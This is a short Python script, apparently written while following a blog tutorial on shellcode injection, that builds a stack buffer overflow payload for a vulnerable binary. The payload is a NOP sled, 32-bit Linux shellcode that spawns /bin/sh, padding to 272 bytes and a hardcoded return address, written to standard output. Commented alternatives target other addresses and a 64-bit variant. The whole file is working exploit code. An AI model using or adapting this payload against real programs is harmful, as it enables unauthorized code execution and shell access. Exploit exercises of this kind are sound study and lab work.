# https://dhavalkapil.com/blogs/Shellcode-Injection/

import struct
import sys

# pad = b"\x41" * 47
addr = struct.pack("<I", 0xffffd21c)
# addr = b"\x50\xcf\xff\xff"
# addr = b"\xd0\xc8\xff\xff"


# vuln64 - 0x7fffffffd554
# addr = struct.pack("<Q", 0x7fffffffe0b4)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
NOP = b"\x90" * 40


pad_len = 272 - len(shellcode) - len(NOP) - len(addr)
# print(pad_len)
pad = b"\x41" * pad_len
payload = NOP + shellcode + pad + addr
# print(payload)
sys.stdout.buffer.write(payload)
